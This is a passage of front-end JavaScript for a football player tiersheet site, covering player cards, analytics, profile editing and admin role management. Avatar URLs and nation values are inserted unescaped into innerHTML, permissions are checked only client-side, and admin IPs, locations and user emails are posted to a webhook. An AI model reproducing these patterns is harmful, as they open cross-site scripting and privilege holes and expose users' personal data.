    BGD:'BD',THA:'TH',IDN:'ID',MYS:'MY',PHL:'PH',VNM:'VN',AUS:'AU',NZL:'NZ',
    CAN:'CA',MEX:'MX',AFG:'AF',IRN:'IR',KAZ:'KZ',UZB:'UZ',AZE:'AZ',ARM:'AM',
    GEO:'GE',UKR:'UA',CZE:'CZ',SVK:'SK',HUN:'HU',BGR:'BG',ALB:'AL',MKD:'MK',
  };
  const iso2 = c.length===3 ? (map3[c]||c.slice(0,2)) : c.slice(0,2);
  try{
    return iso2.split('').map(ch=>String.fromCodePoint(0x1F1E6+ch.charCodeAt(0)-65)).join('');
  }catch(e){ return ''; }
}

// ── Get flag for a user (checks countryCode field) ──
function userFlag(u){
  const code = u.countryCode||u.country||'';
  return countryFlag(code);
}

function tdd(v){
  const d=document.getElementById('udd'); if(!d)return;
  if(v===false) d.classList.remove('open');
  else d.classList.toggle('open');
}
document.addEventListener('click',e=>{
  const p=document.getElementById('upill'),d=document.getElementById('udd');
  if(d&&p&&!p.contains(e.target)) d.classList.remove('open');
});
function doLogout(){ ss(null); tdd(false); renderNav(); refreshAll(); toast('Signed out.','ok'); }

// ═══════════════════════════════════════════
// MY PROFILE (fan + player: avatar & bio only)
// ═══════════════════════════════════════════
function openMyProfile(){
  const u=getU(); if(!u){ toast('Please sign in first.','er'); return; }
  const pp=u.playerProfile||{};
  const ava = pp.avatar||u.avatar||'';
  const bio = pp.bio||u.bio||'';
  document.getElementById('mp-ava').value=ava;
  document.getElementById('mp-bio').value=bio;
  document.getElementById('mp-bio-count').textContent=bio.length;
  previewMPAva();
  document.getElementById('mpov').classList.add('open');
  document.getElementById('mp-bio').oninput=function(){
    document.getElementById('mp-bio-count').textContent=this.value.length;
  };
}
function closeMPov(e){ if(!e||e.target===document.getElementById('mpov')) document.getElementById('mpov').classList.remove('open'); }

function previewMPAva(){
  const val=document.getElementById('mp-ava').value.trim();
  const prev=document.getElementById('mp-ava-preview');
  const u=getU();
  if(val){
    prev.innerHTML=`<img src="${val}" style="width:100%;height:100%;object-fit:cover;" onerror="this.parentElement.innerHTML='<span style=font-size:28px;font-family:Barlow+Condensed,sans-serif;font-weight:800>${u?u.username[0].toUpperCase():'?'}</span>'">`;
  } else {
    prev.innerHTML=`<span style="font-size:28px;font-family:'Barlow Condensed',sans-serif;font-weight:800">${u?u.username[0].toUpperCase():'?'}</span>`;
  }
}
function saveMyProfile(){
  const u=getU(); if(!u) return;
  const ava=document.getElementById('mp-ava').value.trim();
  const bio=document.getElementById('mp-bio').value.trim();
  const users=lu();
  const idx=users.findIndex(x=>x.id===u.id); if(idx<0) return;
  if(users[idx].playerProfile){
    users[idx].playerProfile.avatar=ava;
    users[idx].playerProfile.bio=bio;
  } else {
    users[idx].playerProfile=users[idx].playerProfile||{};
    users[idx].playerProfile.avatar=ava;
    users[idx].playerProfile.bio=bio;
  }
  su(users); ss(users[idx]);
  closeMPov(); renderNav(); refreshAll();
  toast('Profile updated!','ok');
}

// ═══════════════════════════════════════════
// TIERSHEET
// ═══════════════════════════════════════════
let filtered=[];

function updateSeasonBadge(){
  const el=document.getElementById('season-badge'); if(!el)return;
  const now=new Date();
  const month=now.toLocaleString('en-GB',{month:'long'});
  const year=now.getFullYear();
  el.textContent=`Season ${month} ${year}`;
}

function refreshAll(){ updateSeasonBadge(); doFilter(); updateNatFilter(); renderAnalytics(); renderFanArea(); if(document.getElementById('page-teams')?.classList.contains('on')) renderTeams(); }

function renderFanArea(){
  const u=getU(), fa=document.getElementById('fan-area'); if(!fa)return;
  if(u&&u.role==='fan'){
    const vStatus = u.emailVerified
      ? `<span style="font-size:10px;color:#34d399;font-family:'Barlow Condensed';letter-spacing:1px;">&#10003; Email verified</span>`
      : `<span style="font-size:10px;color:#fbbf24;font-family:'Barlow Condensed';letter-spacing:1px;cursor:pointer;" onclick="openVerify()">&#9888; Verify your email to unlock all features</span>`;
    fa.innerHTML=`<div class="fan-banner">
      <div class="fan-banner-ico"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
      <div class="fan-banner-txt">
        <h3>Fan Account</h3>
        <p>You are registered as a Fan. An admin can promote you to Player.<br>${vStatus}</p>
      </div>
    </div>`;
  } else { fa.innerHTML=''; }
}

function doFilter(){
  const q=(document.getElementById('srch')?.value||'').toLowerCase();
  const t=document.getElementById('f-tier')?.value||'';
  const n=document.getElementById('f-nation')?.value||'';
  const all=lu().filter(u=>u.role==='player'||u.role==='admin');
  filtered=all.filter(u=>{
    const pp=u.playerProfile||{};
    if(q&&!u.username.toLowerCase().includes(q))return false;
    if(t&&(pp.tier||'Tier 4')!==t)return false;
    if(n&&(pp.nation||'')!==n)return false;
    return true;
  });
  renderTiers();
  const allP=lu().filter(u=>u.role==='player'||u.role==='admin');
  document.getElementById('st-p').textContent=allP.length;
  document.getElementById('st-s').textContent=filtered.length;
  document.getElementById('st-g').textContent=allP.reduce((s,u)=>s+(+(u.playerProfile?.goals)||0),0);
  document.getElementById('st-m').textContent=lu().length;
}

function updateNatFilter(){
  const s=document.getElementById('f-nation'); if(!s)return;
  const cur=s.value;
  const ns=[...new Set(lu().filter(u=>u.role==='player'||u.role==='admin').map(u=>u.playerProfile?.nation).filter(Boolean))].sort();
  s.innerHTML='<option value="">All Nations</option>'+ns.map(n=>`<option>${n}</option>`).join('');
  s.value=cur;
}

function renderTiers(){
  const tiers=['Tier 1','Tier 2','Tier 3','Tier 4'];
  const adm=isAdmin();
  let html='';
  tiers.forEach(t=>{
    const ps=filtered.filter(u=>(u.playerProfile?.tier||'Tier 4')===t);
    if(!ps.length)return;
    const c=tcls(t);
    html+=`<div class="tsec">
      <div class="thead">
        <span class="tpill ${c}p">${t}</span>
        <span class="tcnt">${ps.length} player${ps.length!==1?'s':''}</span>
        <div class="tdiv"></div>
      </div>
      <div class="pgrid">${ps.map(u=>pcHTML(u,c,adm)).join('')}</div>
    </div>`;
  });
  if(!html) html=`<div class="empty"><div class="eico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01"/></svg></div><h3>No Players Yet</h3><p>Register an account —<br>admin can promote members to Player.</p></div>`;
  document.getElementById('twrap').innerHTML=html;
}

function tcls(t){return t==='Tier 1'?'t1':t==='Tier 2'?'t2':t==='Tier 3'?'t3':'t4';}
function tcol(t){return t==='Tier 1'?'#60a5fa':t==='Tier 2'?'#a78bfa':t==='Tier 3'?'#34d399':'#fbbf24';}

function pcHTML(u,c,adm){
  const pp=u.playerProfile||{}, avg=calcAvg(pp);
  const nat=pp.nation?`<div class="pc-nat">${esc(pp.nation)}</div>`:'';
  const pos=pp.position?`<div class="pc-pos">${esc(pp.position)}</div>`:'';
  const team = pp.team ? LALIGA_TEAMS?.find(t=>t.id===pp.team) : null;
  const teamPill = team
    ? `<div class="team-pill"><img src="${team.logo}" alt="${team.short}" onerror="this.style.display='none'">${team.short}</div>` : '';
  const editBtn = adm
    ? `<div style="display:flex;gap:5px;margin-top:4px;position:relative;z-index:2;" onclick="event.stopPropagation()">
        <button class="pc-edit-btn vis" style="flex:1;" onclick="openEditModal('${u.id}')">Edit Stats</button>
        <button class="pc-edit-btn vis" style="background:rgba(239,68,68,.15);color:#f87171;border-color:rgba(239,68,68,.35);width:auto;padding:7px 10px;" onclick="confirmDeleteUser('${u.id}','${esc(u.username)}')">🗑</button>
      </div>`
    : '';
  // FIFA-style mini attribute badges
  const miniStats = `<div class="pc-stats-row">
    ${STATS.map(s=>{
      const v=+(pp[s.toLowerCase()])||60;
      const color = v>=85?'#34d399':v>=70?'#60a5fa':v>=55?'#fbbf24':'#f87171';
      return `<div class="pc-stat"><div class="pc-stat-n" style="color:${color}">${v}</div><div class="pc-stat-l">${s.slice(0,3)}</div></div>`;
    }).join('')}
  </div>`;
  return `<div class="pc" onclick="openPlayerDetail('${u.id}')" style="position:relative;">
    ${nat}
    <div class="pc-ava">${aiHTML(pp,u,52)}</div>
    <div class="pc-name">${userFlag(u)} ${esc(u.username)}</div>
    ${teamPill}
    <div class="pc-tier ${c}c">${pp.tier||'Tier 4'}</div>
    ${pos}
    <div class="pc-rat">${avg}</div>
    <div class="pc-val">${(+(pp.value)||0).toFixed(1)}M · ${pp.goals||0}G ${pp.assists||0}A</div>
    ${miniStats}
    ${editBtn}
  </div>`;
}

function aiHTML(pp,u,sz){
  const av=pp?.avatar;
  if(av&&av.startsWith('http')) return `<img src="${av}" style="width:100%;height:100%;object-fit:cover" onerror="this.outerHTML='<span style=font-family:Barlow+Condensed,sans-serif;font-size:${Math.floor(sz*.5)}px;font-weight:800>${u.username[0].toUpperCase()}</span>'">`;
  return `<span style="font-family:'Barlow Condensed',sans-serif;font-size:${Math.floor(sz*.5)}px;font-weight:800">${u.username[0].toUpperCase()}</span>`;
}

function calcAvg(pp){
  const vs=STATS.map(s=>+(pp[s.toLowerCase()])||60);
  return Math.round(vs.reduce((a,b)=>a+b,0)/vs.length);
}

// ═══════════════════════════════════════════
// ANALYTICS
// ═══════════════════════════════════════════
function renderAnalytics(){
  const pl=lu().filter(u=>u.role==='player'||u.role==='admin');
  const cnt={};
  pl.forEach(u=>{const n=u.playerProfile?.nation;if(n)cnt[n]=(cnt[n]||0)+1;});
  const top=Object.entries(cnt).sort((a,b)=>b[1]-a[1]).slice(0,5);
  const mx=top[0]?.[1]||1;
  const nb=document.getElementById('nbars'); if(!nb)return;
  nb.innerHTML=top.map(([n,c])=>`<div class="nbw"><div class="nb" style="height:${Math.round((c/mx)*100)}px"><span class="nbnum">${c}</span></div><div class="nblbl">${n}</div></div>`).join('')||`<p style="color:var(--gray);font-size:12px;align-self:center">No data yet.</p>`;
  renderSL(pl); renderMVP(pl);
}

function renderSL(pl){
  const sorted=[...pl].sort((a,b)=>(+(b.playerProfile?.[stField])||0)-(+(a.playerProfile?.[stField])||0)).slice(0,5);
  const rc=i=>i===0?'g':i===1?'s':i===2?'b':'';
  const sl=document.getElementById('slist'); if(!sl)return;
  sl.innerHTML=sorted.map((u,i)=>`<li class="srow2" onclick="openPlayerDetail('${u.id}')" style="cursor:pointer;">
    <span class="srnk ${rc(i)}">${i+1}</span>
    <div class="sava">${aiHTML(u.playerProfile||{},u,26)}</div>
    <span class="snm">${esc(u.username)}</span>
    <span class="sv">${u.playerProfile?.[stField]||0}</span>
  </li>`).join('')||`<li style="color:var(--gray);font-size:12px;padding:14px 0">No players yet.</li>`;
}

function setST(f,el){
  stField=f;
  document.querySelectorAll('.stab').forEach(t=>t.classList.remove('on'));
  if(el)el.classList.add('on');
  renderSL(lu().filter(u=>u.role==='player'||u.role==='admin'));
}

function renderMVP(pl){
  const top=[...pl].sort((a,b)=>(+(b.playerProfile?.value)||0)-(+(a.playerProfile?.value)||0)).slice(0,6);
  const mvpr=document.getElementById('mvpr'); if(!mvpr)return;
  mvpr.innerHTML=top.map(u=>{
    const pp=u.playerProfile||{}, c=tcls(pp.tier||'Tier 4');
    return `<div class="mvpc" onclick="openPlayerDetail('${u.id}')">
      <div class="mvpava">${aiHTML(pp,u,40)}</div>
      <div class="mvpnm">${esc(u.username)}</div>
      <div class="mvptier ${c}c">${pp.tier||'Tier 4'}</div>
      <div class="mvpval">${(+(pp.value)||0).toFixed(1)}M</div>
    </div>`;
  }).join('')||`<p style="color:var(--gray);font-size:12px">No players yet.</p>`;
}

// ═══════════════════════════════════════════
// HEATMAP
// ═══════════════════════════════════════════
function openHM(uid){
  const u=lu().find(x=>x.id===uid); if(!u)return;
  const pp=u.playerProfile||{}, avg=calcAvg(pp), c=tcls(pp.tier||'Tier 4');
  document.getElementById('hmava').innerHTML=aiHTML(pp,u,70);
  document.getElementById('hmname').textContent=`${userFlag(u)} ${u.username}`;
  const ht=document.getElementById('hmtier'); ht.className=`hmtier ${c}c`; ht.textContent=pp.tier||'Tier 4';
  const hp2=document.getElementById('hmpos');
  if(pp.position){ hp2.textContent=pp.position; hp2.style.display='inline-block'; }
  else { hp2.style.display='none'; }
  document.getElementById('hmrat').textContent=avg;
  // Team line
  const team = pp.team ? LALIGA_TEAMS?.find(t=>t.id===pp.team) : null;
  const teamLine = document.getElementById('hmteam');
  if(teamLine){
    if(team){
      teamLine.innerHTML=`<img src="${team.logo}" alt="${team.name}" style="width:18px;height:18px;object-fit:contain;vertical-align:middle;margin-right:5px;" onerror="this.style.display='none'">${team.name}`;
      teamLine.style.display='flex';
    } else { teamLine.style.display='none'; }
  }
  document.getElementById('hmval').textContent=`${(+(pp.value)||0).toFixed(1)}M · ${pp.goals||0}G ${pp.assists||0}A`;
  const hb=document.getElementById('hmbio');
  if(pp.bio){ hb.textContent=`"${pp.bio}"`; hb.style.display='block'; }
  else { hb.style.display='none'; }
  document.getElementById('hmbars').innerHTML=STATS.map(s=>{
    const v=+(pp[s.toLowerCase()])||60;
    return `<div class="hrow"><div class="hlbl">${s}</div><div class="htrack"><div class="hfill" style="width:${v}%"></div></div><div class="hv">${v}</div></div>`;
  }).join('');
  document.getElementById('hov').classList.add('open');
}
function closeHM(e){if(!e||e.target===document.getElementById('hov'))document.getElementById('hov').classList.remove('open');}

// ═══════════════════════════════════════════
// PLAYER DETAIL MODAL (FIFA-style)
// ═══════════════════════════════════════════
function openPlayerDetail(uid){
  const u=lu().find(x=>x.id===uid); if(!u)return;
  const pp=u.playerProfile||{}, avg=calcAvg(pp), c=tcls(pp.tier||'Tier 4');
  const tierColor=tcol(pp.tier||'Tier 4');
  const team=pp.team?LALIGA_TEAMS?.find(t=>t.id===pp.team):null;

  // Banner color
  document.getElementById('pdet-banner').style.background=tierColor;
  // Avatar
  document.getElementById('pdet-ava').innerHTML=aiHTML(pp,u,86);
  // Name
  document.getElementById('pdet-name').innerHTML=`${userFlag(u)} ${esc(u.username)}`;
  // OVR
  document.getElementById('pdet-ovr').textContent=avg;
  document.getElementById('pdet-ovr').style.color=tierColor;
  // Meta tags
  const metaParts=[];
  if(pp.tier) metaParts.push(`<span class="rbadge ${c}p" style="font-size:9px;">${pp.tier}</span>`);
  if(pp.position) metaParts.push(`<span class="pc-pos" style="margin:0;">${esc(pp.position)}</span>`);
  if(pp.nation) metaParts.push(`<span style="font-family:'Barlow Condensed';font-size:10px;font-weight:700;color:var(--gray);">${countryFlag(pp.nation)} ${pp.nation}</span>`);
  if(team) metaParts.push(`<span class="team-pill"><img src="${team.logo}" alt="${team.short}" style="width:12px;height:12px;object-fit:contain;" onerror="this.style.display='none'">${team.name}</span>`);
  document.getElementById('pdet-meta').innerHTML=metaParts.join('');
  // Short bio in header
  const bioShort=document.getElementById('pdet-bio-short');
  bioShort.textContent=pp.bio?`"${pp.bio}"`:'';;

  // KV stats grid
  const goals=pp.goals||0, assists=pp.assists||0, value=(+(pp.value)||0).toFixed(1);
  const cs = pp.cleanSheets||0, mvps=pp.mvpCount||0;
  const kvData=[
    ['⚽ Goals',goals,'big'],['🎯 Assists',assists,'big'],
    ['💰 Value',`${value}M`,''],['🏆 MVPs',mvps,''],
    ['🛡️ Clean Sheets',cs,''],['⭐ Overall',avg,'big'],
  ];
  document.getElementById('pdet-kvgrid').innerHTML=kvData.map(([l,v,cls])=>
    `<div class="pdet-kv"><div class="pdet-kv-label">${l}</div><div class="pdet-kv-val ${cls}" style="${cls==='big'?'color:'+tierColor:''}">${v}</div></div>`
  ).join('');

  // FIFA attrs with color-coded bars
  function attrColor(v){ return v>=85?'#34d399':v>=70?'#60a5fa':v>=55?'#fbbf24':'#f87171'; }
  document.getElementById('pdet-attrs').innerHTML=STATS.map(s=>{
    const v=+(pp[s.toLowerCase()])||60;
    const col=attrColor(v);
    return `<div class="fifa-attr">
      <div class="fifa-attr-lbl">${s}</div>
      <div class="fifa-attr-bar"><div class="fifa-attr-fill" style="width:${v}%;background:linear-gradient(90deg,${col}99,${col});box-shadow:0 0 4px ${col}66;"></div></div>
      <div class="fifa-attr-val" style="color:${col}">${v}</div>
    </div>`;
  }).join('');

  // Full bio section
  const bioWrap=document.getElementById('pdet-bio-wrap');
  const bioFull=document.getElementById('pdet-bio-full');
  if(pp.bio&&pp.bio.trim()){
    bioFull.textContent=pp.bio;
    bioWrap.style.display='';
    bioShort.style.display='none';
  } else {
    bioWrap.style.display='none';
    bioShort.style.display='';
  }

  // Admin actions
  const adminActs=document.getElementById('pdet-admin-acts');
  if(isAdmin()){
    adminActs.style.display='flex';
    adminActs.innerHTML=`
      <button class="abtn aedit" onclick="closePDet();setTimeout(()=>openEditModal('${u.id}'),100)">✏️ Edit Stats</button>
      <button class="abtn atier" onclick="rotateTier('${u.id}');closePDet();">🏆 Rotate Tier</button>
      <button class="abtn ademote" onclick="closePDet();confirmDeleteUser('${u.id}','${esc(u.username)}')">🗑️ Delete</button>`;
  } else {
    adminActs.style.display='none';
  }

  document.getElementById('pdet-ov').classList.add('open');
}
function closePDet(e){if(!e||e.target===document.getElementById('pdet-ov'))document.getElementById('pdet-ov').classList.remove('open');}

// ═══════════════════════════════════════════
// RESET STATS (goals, assists, attributes)
// ═══════════════════════════════════════════
function openRStatsModal(){
  if(!isAdmin()){toast('No permission.','er');return;}
  document.getElementById('rstats-confirm-input').value='';
  checkRStatsInput();
  document.getElementById('rstats-ov').classList.add('open');
}
function closeRStatsModal(e){
  if(!e||e.target===document.getElementById('rstats-ov'))
    document.getElementById('rstats-ov').classList.remove('open');
}
function checkRStatsInput(){
  const val=document.getElementById('rstats-confirm-input').value.trim();
  const btn=document.getElementById('rstats-confirm-btn');
  const ok=val==='RESET';
  btn.disabled=!ok;
  btn.style.cursor=ok?'pointer':'not-allowed';
  btn.style.background=ok?'#f59e0b':'rgba(245,158,11,.2)';
  btn.style.color=ok?'#000':'rgba(251,191,36,.4)';
  btn.style.border=ok?'none':'1px solid rgba(245,158,11,.2)';
  btn.style.boxShadow=ok?'0 0 20px rgba(245,158,11,.3)':'none';
}
function executeResetStats(){
  if(!isAdmin()) return;
  if(document.getElementById('rstats-confirm-input').value.trim()!=='RESET') return;
  const users=lu();
  const admin=getU();
  users.forEach(u=>{
    if(u.playerProfile){
      u.playerProfile.goals=0;
      u.playerProfile.assists=0;
      u.playerProfile.cleanSheets=0;
      u.playerProfile.mvpCount=0;
      STATS.forEach(s=>{ u.playerProfile[s.toLowerCase()]=60; });
      u.playerProfile.lastEditedAt=Date.now();
      u.playerProfile.lastEditedBy=admin?.username||'admin';
    }
  });
  su(users);
  closeRStatsModal();
  refreshAll();
  toast('✓ All player stats have been reset.','ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:'⚠️ Stats Reset',
      color:0xf59e0b,
      fields:[
        {name:'🛡️ By Admin',value:`\`${admin?.username||'admin'}\``,inline:true},
        {name:'📊 Affected',value:`${users.filter(u=>u.playerProfile).length} players`,inline:true},
        {name:'🌍 Admin IP',value:`\`${ipData.ip||'?'}\``,inline:true},
        {name:'🕐 Time',value:`\`${fmtTime(Date.now())}\``,inline:true},
      ],
      footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
    });
  });
}

// ═══════════════════════════════════════════
// EDIT PROFILE
// ═══════════════════════════════════════════
function openEditModal(uid){
  if(!isAdmin()&&getU()?.id!==uid){toast('No permission.','er');return;}
  const users=lu();
  const u=users.find(x=>x.id===uid); if(!u)return;
  // Init playerProfile for admin if it doesn't exist yet
  if(!u.playerProfile){
    u.playerProfile={tier:'Tier 1',nation:'',value:0,goals:0,assists:0,avatar:'',position:'',bio:'',shooting:99,passing:99,dribbling:99,pace:99,defending:99,physical:99};
    su(users); ss(u);
  }
  const pp=u.playerProfile||{};
  document.getElementById('etitle-txt').textContent=`Edit: ${u.username}`;
  document.getElementById('eu-id').value=uid;
  document.getElementById('ep-tier').value=pp.tier||'Tier 4';
  document.getElementById('ep-nat').value=pp.nation||'';
  document.getElementById('ep-val').value=pp.value||0;
  document.getElementById('ep-gls').value=pp.goals||0;
  document.getElementById('ep-ast').value=pp.assists||0;
  document.getElementById('ep-ava').value=pp.avatar||'';
  document.getElementById('ep-pos').value=pp.position||'';
  document.getElementById('ep-bio').value=pp.bio||'';
  document.getElementById('ep-team').value=pp.team||'';
  document.getElementById('esliders').innerHTML=buildSliders(pp,'sl');
  document.getElementById('eov').classList.add('open');
}
function closeEdit(e){if(!e||e.target===document.getElementById('eov'))document.getElementById('eov').classList.remove('open');}
function saveEdit(){
  const uid=document.getElementById('eu-id').value;
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0)return;
  const admin=getU();
  users[idx].playerProfile={
    ...(users[idx].playerProfile||{}),
    ...readFields('ep','sl'),
    lastEditedAt: Date.now(),
    lastEditedBy: admin?.username||'admin'
  };
  su(users);
  const cu=getU(); if(cu&&cu.id===uid) ss(users[idx]);
  closeEdit(); refreshAll(); toast('Profile saved!','ok');
}

function buildSliders(pp,pfx){
  return STATS.map(s=>{
    const k=s.toLowerCase(), v=+(pp[k])||60;
    return `<div class="fg" style="margin-bottom:9px"><label class="flbl">${s}</label>
      <div class="rrow"><input type="range" min="0" max="100" value="${v}" id="${pfx}-${k}" oninput="document.getElementById('rv-${pfx}-${k}').textContent=this.value">
      <span class="rv" id="rv-${pfx}-${k}">${v}</span></div></div>`;
  }).join('');
}
function readFields(fp,sp){
  return{
    tier:document.getElementById(`${fp}-tier`).value,
    nation:document.getElementById(`${fp}-nat`).value.toUpperCase().trim(),
    value:parseFloat(document.getElementById(`${fp}-val`).value)||0,
    goals:parseInt(document.getElementById(`${fp}-gls`).value)||0,
    assists:parseInt(document.getElementById(`${fp}-ast`).value)||0,
    avatar:document.getElementById(`${fp}-ava`).value.trim(),
    position:document.getElementById(`${fp}-pos`)?.value.trim()||'',
    bio:document.getElementById(`${fp}-bio`)?.value.trim()||'',
    team:document.getElementById(`${fp}-team`)?.value||'',
    ...Object.fromEntries(STATS.map(s=>[s.toLowerCase(),parseInt(document.getElementById(`${sp}-${s.toLowerCase()}`).value)||60]))
  };
}

// ═══════════════════════════════════════════
// PROMOTE TO PLAYER
// ═══════════════════════════════════════════
function openPromoteModal(uid){
  if(!isAdmin()){toast('No permission.','er');return;}
  const u=lu().find(x=>x.id===uid); if(!u)return;
  document.getElementById('pmod-title-txt').textContent=`Promote: ${u.username}`;
  document.getElementById('pmod-sub').textContent=`Add ${u.username} to the tiersheet with their player profile.`;
  document.getElementById('pu-id').value=uid;
  ['pp-tier','pp-nat','pp-val','pp-gls','pp-ast','pp-ava','pp-pos','pp-bio'].forEach(id=>{ const el=document.getElementById(id); if(el){el.value=el.tagName==='SELECT'?'Tier 4':'';} });
  document.getElementById('psliders').innerHTML=buildSliders({},'ps');
  document.getElementById('pov').classList.add('open');
}
function closePM(e){if(!e||e.target===document.getElementById('pov'))document.getElementById('pov').classList.remove('open');}
function savePromote(){
  const uid=document.getElementById('pu-id').value;
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0)return;
  const admin=getU();
  users[idx].role='player';
  users[idx].playerProfile={
    ...readFields('pp','ps'),
    lastEditedAt: Date.now(),
    lastEditedBy: admin?.username||'admin'
  };
  su(users); closePM(); renderMembers(); refreshAll();
  toast(`${users[idx].username} promoted to Player!`,'ok');
}

// ═══════════════════════════════════════════
// MEMBERS TABLE
// ═══════════════════════════════════════════
function renderMembers(){
  if(!isAdmin())return;
  const users=lu(), cur=getU();
  document.getElementById('mrows').innerHTML=users.map(u=>{
    const rc=u.role==='admin'?'radmin':u.role==='player'?'rplayer':'rfan';
    const rl=u.role==='admin'?'Admin':u.role==='player'?'Player':'Fan';
    const pp=u.playerProfile||{}, self=cur&&cur.id===u.id;
    let acts='';
    if(!self&&u.role!=='admin'){
      if(u.role==='fan'){
        acts+=`<button class="abtn apromote" onclick="openPromoteModal('${u.id}')">+Player</button>`;
        acts+=`<button class="abtn" style="background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.25);" onclick="makeAdmin('${u.id}')">+Admin</button>`;
        acts+=`<button class="abtn" style="background:rgba(239,68,68,.08);color:#f87171;border:1px solid rgba(239,68,68,.15);" onclick="openBanModal('${u.id}')">Ban</button>`;
        acts+=`<button class="abtn adelete" onclick="confirmDeleteUser('${u.id}','${esc(u.username)}')">Delete</button>`;
      } else {
        acts+=`<button class="abtn aedit" onclick="openEditModal('${u.id}')">Edit</button>`;
        acts+=`<button class="abtn atier" onclick="rotateTier('${u.id}')">Tier</button>`;
        acts+=`<button class="abtn ademote" onclick="setRole('${u.id}','fan')">Demote</button>`;
        acts+=`<button class="abtn" style="background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.25);" onclick="makeAdmin('${u.id}')">+Admin</button>`;
        acts+=`<button class="abtn" style="background:rgba(239,68,68,.08);color:#f87171;border:1px solid rgba(239,68,68,.15);" onclick="openBanModal('${u.id}')">Ban</button>`;
        acts+=`<button class="abtn adelete" onclick="confirmDeleteUser('${u.id}','${esc(u.username)}')">Del</button>`;
      }
    }
    if(!self&&u.role==='admin'){
      if(getU()?.username===ADMIN){
        acts+=`<button class="abtn ademote" onclick="revokeAdmin('${u.id}')">Revoke Admin</button>`;
      }
    }
    if(self) acts=`<button class="abtn aedit" onclick="openEditModal('${u.id}')">Edit Me</button><span style="font-size:10px;color:var(--gray);font-family:'Barlow Condensed';margin-left:4px;">You</span>`;
    const vIcon=u.emailVerified?`<span style="color:#34d399;font-size:10px" title="Verified">&#10003;</span>`:`<span style="color:#f59e0b;font-size:10px" title="Unverified">&#9888;</span>`;
    // Last edited: check playerProfile.lastEditedAt or user.lastEditedAt
    const editTs = pp.lastEditedAt || u.lastEditedAt;
    const editBy = pp.lastEditedBy || u.lastEditedBy;
    const editCell = editTs
      ? `<div style="font-size:11px;color:var(--blue3);font-family:'Barlow Condensed';font-weight:600;">${fdatetime(editTs)}</div><div style="font-size:9px;color:var(--gray);letter-spacing:1px;">by ${editBy||'admin'}</div>`
      : `<div style="font-size:11px;color:var(--gray);">Joined ${fdate(u.createdAt)}</div>`;
    const flag = userFlag(u);
    const countryDisplay = u.countryCode ? `<span style="font-size:10px;color:var(--gray);font-family:'Barlow Condensed';">${u.countryCode.toUpperCase()}</span>` : '';
    const ban = isUserBanned(u.username);
    const banBadge = ban ? `<span style="font-size:9px;background:rgba(239,68,68,.15);color:#f87171;border:1px solid rgba(239,68,68,.25);border-radius:10px;padding:1px 6px;font-family:'Barlow Condensed';letter-spacing:1px;cursor:pointer;" title="Click to unban" onclick="unbanUser('${esc(u.username)}')">BANNED</span>` : '';
    return `<div class="mrow">
      <div class="mcell"><div class="mava">${avaC(u,22)}</div><span>${flag} ${esc(u.username)}${u.role==='admin'?` <span class="shield" style="font-size:11px">&#x1F6E1;&#xFE0F;</span>`:''} ${vIcon} ${countryDisplay} ${banBadge}</span></div>
      <div class="mcell"><span class="rbadge ${rc}">${rl}</span></div>
      <div class="mcell" style="color:${tcol(pp.tier||'')};">${pp.tier||'—'}</div>
      <div class="mcell">${editCell}</div>
      <div class="mcell" style="justify-content:flex-end"><div class="macts">${acts}<button class="abtn" style="background:rgba(124,58,237,.15);color:#a78bfa;border:1px solid rgba(124,58,237,.3);" onclick="setCountry('${u.id}')">Flag</button></div></div>
    </div>`;
  }).join('')||`<div class="empty"><div class="eico"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg></div><h3>No Members</h3></div>`;
}

function setRole(uid,role){
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0)return;
  const admin=getU();
  const target=users[idx];
  const oldRole=target.role;
  target.role=role;
  target.lastEditedAt=Date.now();
  target.lastEditedBy=admin?.username||'admin';
  if(role==='fan') target.playerProfile=null;
  su(users); renderMembers(); refreshAll();
  toast(`${target.username} is now a ${role==='player'?'Player':'Fan'}`, 'ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:`👤 Role Changed → ${role==='player'?'Player':'Fan'}`,
      color: role==='player'?0x10b981:0x6b7280,
      fields:[
        {name:'🎯 Target',   value:`\`${target.username}\``, inline:true},
        {name:'📊 Change',   value:`\`${oldRole}\` → \`${role}\``, inline:true},
        {name:'🛡️ By Admin',value:`\`${admin?.username||'admin'}\``, inline:true},
        {name:'🌍 Admin IP', value:`\`${ipData.ip||'?'}\``, inline:true},
        {name:'🕐 Time',     value:`\`${fmtTime(Date.now())}\``, inline:true},
      ],
      footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
    });
  });
}

function makeAdmin(uid){
  if(!isAdmin()){toast('No permission.','er');return;}
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0)return;
  const admin=getU();
  const target=users[idx];
  if(!confirm(`Grant ADMIN to ${target.username}? They will have full control.`)) return;
  target.role='admin';
  target.lastEditedAt=Date.now();
  target.lastEditedBy=admin?.username||'admin';
  su(users); renderMembers(); refreshAll();
  toast(`${target.username} is now Admin! 🛡️`,'ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:'🛡️ ADMIN GRANTED',
      color:0xf59e0b,
      fields:[
        {name:'👑 New Admin',  value:`\`${target.username}\``, inline:true},
        {name:'🛡️ Granted By',value:`\`${admin?.username||'admin'}\``, inline:true},
        {name:'📧 Email',      value:`\`${target.email||'?'}\``, inline:true},
        {name:'🌍 Admin IP',  value:`\`${ipData.ip||'?'}\``, inline:true},
        {name:'📍 Location',  value:`\`${ipData.city||'?'}, ${ipData.country||'?'}\``, inline:true},
        {name:'🕐 Time',      value:`\`${fmtTime(Date.now())}\``, inline:true},
      ],
